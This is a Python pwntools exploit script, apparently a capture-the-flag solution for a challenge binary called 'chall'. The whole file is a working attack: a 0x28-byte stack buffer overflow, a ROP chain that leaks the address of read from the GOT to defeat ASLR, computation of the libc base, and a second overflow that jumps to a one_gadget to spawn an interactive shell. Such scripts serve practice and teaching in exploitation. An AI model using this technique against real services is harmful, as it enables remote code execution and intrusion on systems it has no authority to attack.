from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = './libc.so.6'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io, **kwargs):
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', '18')
    
    exploit = b'a' * 0x28
    rop = ROP(binf)
    rop.puts(binf.got['read'])
    rop.main()
    exploit += rop.chain()

    io.sendlineafter('*', exploit)
    io.recvuntil('your')
    io.recvline()
    leak = unpack(io.recv(6), 'all')
    libc.address = leak - libc.symbols['read']
    onegad = [0x4f3d5, 0x4f432, 0x10a41c]

    io.sendlineafter('*', 'a')
    io.sendlineafter('*', 'a')
    io.sendlineafter('*', '18')
    io.sendlineafter('*', b'a'*0x28 + p64(libc.address + onegad[1]))


def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
